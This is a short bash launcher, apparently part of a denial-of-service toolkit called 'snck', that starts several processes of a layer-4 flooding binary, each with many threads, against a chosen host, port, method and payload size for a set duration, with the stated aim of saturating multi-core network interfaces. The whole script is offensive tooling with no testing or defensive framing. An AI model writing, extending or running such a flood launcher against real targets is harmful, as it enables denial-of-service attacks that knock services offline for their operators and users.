#!/usr/bin/env bash
# Snck ultra launcher — N processes x T threads (fills multi-core / multi-queue NICs)
# Usage: ./snck_ultra.sh <method> <host> <port> <processes> <threads_per> <duration> [payload]
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="${DIR}/snck_l4"
METHOD="${1:?}"; HOST="${2:?}"; PORT="${3:?}"
PROCS="${4:-2}"; THREADS="${5:-32}"; DUR="${6:-60}"; PAYLOAD="${7:-1200}"

if [[ ! -x "$BIN" ]]; then
  echo "[*] building..."
  bash "${DIR}/build.sh"
fi

echo "[snck_ultra] ${PROCS} processes x ${THREADS} threads = $((PROCS*THREADS)) workers"
pids=()
for ((i=0; i<PROCS; i++)); do
  "$BIN" "$METHOD" "$HOST" "$PORT" "$THREADS" "$DUR" "$PAYLOAD" &
  pids+=($!)
done
trap 'kill "${pids[@]}" 2>/dev/null || true' INT TERM
wait "${pids[@]}" || true
echo "[snck_ultra] done"
